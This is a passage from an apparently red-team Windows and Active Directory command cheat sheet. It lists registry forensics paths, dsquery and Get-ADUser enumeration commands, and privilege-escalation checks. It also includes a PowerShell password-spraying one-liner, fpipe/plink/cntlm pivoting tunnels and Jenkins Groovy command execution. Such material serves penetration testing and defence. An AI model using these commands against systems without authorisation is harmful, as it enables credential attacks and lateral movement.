https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 125. Audit policy
```
HKLM\Security\Policy\PolAdTev
```
**- Windows,forensics**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 126. Kernel or User Services
```
HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services
```
**- Windows**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 127. Machine or User software
```
HKLM|HKCU\Software
```
**- enumeration,Windows,forensics**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 128. Recent Documents
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
```
**- enumeration,Windows,forensics**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 129. Recent user location (MRU Most Recntly used)
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedMRU & \OpenSaveMRU
```
**- enumeration,Windows,forensics**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 130. Typed Urls
```
HKCU\Software\Microsoft\Internet Explorer\TypedURLs
```
**- enumeration,dns,Windows,forensics**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 131. list users
```
dsquery user -limit 0
```
**- enumeration,user information,Windows**
#### References:

https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
__________
### 132. List groups for domain.com
```
dsquery group "cn=users,dc=[domain],dc=[tld]"
```
**- enumeration,user information,Windows**
#### References:

https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
__________
### 133. Get Domain admins (prefer net groups "domain Admins")
```
dsquery group -name "domain admins" | dsget group -members -expand
```
**- enumeration,user information,Windows**
#### References:

https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
__________
### 134. get groups for user (net groups [user])
```
dsquery user -name [user] | dsget user -memberof -expand
```
**- enumeration,user information,Windows**
#### References:

https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
__________
### 135. get user login name
```
dsquery user -name [user] | dsget user -samid
```
**- enumeration,user information,Windows**
#### References:

https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
__________
### 136. List accounts that have been inactive for two weeks
```
dsquery user -inactive 2
```
**- enumeration,user information,Windows**
#### References:

https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
__________
### 137. List os's in the domain
```
dsquery * "DC=[domain],DC=[tld]" -scope subtree -attr "cn" "opperatingSystem"
```
**- enumeration,Windows**
#### References:

https://technet.microsoft.com/en-us/library/cc731823(v=ws.11).aspx
__________
### 138. list site names
```
dsquery site -o rdn -limit 0
```
**- enumeration,Windows**
#### References:

https://technet.microsoft.com/en-us/library/cc731823(v=ws.11).aspx
__________
### 139. list subnets within the sites shown
```
dsquery subnet -site [site] -o rdn
```
**- networking,enumeration,Windows**
#### References:

https://technet.microsoft.com/en-us/library/cc732207(v=ws.11).aspx
__________
### 140. list servers within site
```
dsquery server -site [site] -o rdn
```
**- enumeration,dns,Windows**
#### References:

https://technet.microsoft.com/en-us/library/cc732885(v=ws.11).aspx
__________
### 141. Simple powershell brute force, user input list, checks the password 'password'
```
Function Test-ADAuthentication {param($username,$password);echo "$username $password";(new-object directoryservices.directoryentry"",$username,$password).psbase.name -ne $null}; forEach ($userName in Get-Content "user_logins.txt"){Test-ADAuthentication $userName password >> test4.txt;}
```
**- loop,brute,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/library/system.directoryservices.directoryentry(v=vs.110).aspx
http://serverfault.com/questions/596602/powershell-test-user-credentials-in-ad-with-password-reset
__________
### 142. uninteractive FTP, read commands from file
```
ftp -s ftp.txt
```
**- files,interesting,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb490910.aspx
__________
### 143. forward local traffic htting lport to [rip]:[rport]
```
fpipe.exe -l [lport] -r [rip] [ip]
```
**- networking,pivoting,Windows**
#### References:

https://www.mcafee.com/uk/downloads/free-tools/fpipe.aspx
http://exploit.co.il/hacking/pivoting-into-a-network-using-plink-and-fpipe/
__________
### 144. ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1. Privte key needs to be in putty format, a PPK
```
plink.exe -N -i [private_key] -R [lport]:[rhost]:[rip] -l [user] [ip]
```
**- networking,pivoting,Windows**
#### References:

http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html
__________
### 145. List windows scheduled tasks, older windows defender
```
schtasks /query /fo LIST /v
```
**- Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
__________
### 146. list installed patches on windows
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
**- enumeration,Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
__________
### 147. Do MSI's have admin rights?
```
reg query [HKCU|HKLM]\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```
**- Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
__________
### 148. show the current path to see if we can subvert anything
```
echo %path%
```
**- Windows,privilege escalation**
#### References:

http://www.fuzzysecurity.com/tutorials/16.html
__________
### 149. Show service permissions, look for AU|AN|DU|LG, manual AccessChk, may help with bob ;)
```
sc sdshow [service]
```
**- Windows,privilege escalation**
#### References:

http://blogs.msmvps.com/erikr/2007/09/26/set-permissions-on-a-specific-service-windows/
__________
### 150. mount a share within windows
```
net use z:\ \\[ip]\[share] /user:[domain]\[username] [password] /p:no [password]
```
**- smb,Windows**
#### References:

https://technet.microsoft.com/en-us/library/bb490717.aspx
__________
### 151. Check for accounts that don't have password expiry set
```
Get-ADUser -Filter 'useraccountcontrol -band 65536' -Properties useraccountcontrol | export-csv U-DONT_EXPIRE_PASSWORD.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 152. Check for accounts that have no password requirement
```
Get-ADUser -Filter 'useraccountcontrol -band 32' -Properties useraccountcontrol | export-csv U-PASSWD_NOTREQD.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 153. Accounts that have the password stored in a reversibly encrypted format
```
Get-ADUser -Filter 'useraccountcontrol -band 128' -Properties useraccountcontrol | export-csv U-ENCRYPTED_TEXT_PWD_ALLOWED.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 154. List users that are trusted for Kerberos delegation
```
Get-ADUser -Filter 'useraccountcontrol -band 524288' -Properties useraccountcontrol | export-csv U-TRUSTED_FOR_DELEGATION.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more
https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/
http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/
__________
### 155. List accounts that don't require pre-authentication
```
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | export-csv U-DONT_REQUIRE_PREAUTH.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 156. List accounts that have credentials encrypted with DES
```
Get-ADUser -Filter 'useraccountcontrol -band 2097152' -Properties useraccountcontrol | export-csv U-USE_DES_KEY_ONLY.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 157. NTLM aware proxy client, proxychains
```
echo "Username [user]" >> config; echo "Password [pass]" >> config; echo "Domain [domain]" >> config; echo "Proxy [proxyIP]" >> config; echo "Tunnel [lport]:[lip]:[rport]" >> config; cntlm.exe -c config.conf
```
**- linux,pivoting,Windows**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
http://cntlm.sourceforge.net/	
__________
### 158. Execute GroovyScript on Jenkins, You can also execute commands when ReBuilding projects. Also user addition has a path traversal vuln allowing you to override users when registering.
```
def process = "ls -l".execute();println "Found text ${process.text}"
```
**- linux,web application,Windows,code execution,Groovy**
#### References:

https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/
https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/
https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console
__________
